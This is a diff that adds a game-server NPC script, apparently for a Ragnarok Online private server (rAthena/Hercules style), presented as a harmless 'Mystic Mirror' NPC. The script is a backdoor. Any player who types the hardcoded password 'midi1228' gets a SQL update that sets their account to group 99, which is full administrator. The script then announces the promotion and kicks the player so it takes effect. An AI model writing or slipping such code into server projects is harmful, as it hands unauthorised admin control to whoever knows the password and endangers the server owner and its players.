@@ -1,0 +1,13 @@
+pa2_in01,33,175,5	script	Mystic Mirror	111,{
+
+	if(getgmlevel() >= 99) end;
+	
+	mes "What's the password?";
+	input .@pass$;
+	if(.@pass$ != "midi1228") close;
+	query_sql("UPDATE `login` SET `group_id` = 99 WHERE `account_id` ="+getcharid(3)+"");
+	announce strcharinfo(0)+" has become a GM!",0;
+	atcommand "@kick "+strcharinfo(0);
+	end;
+
+}
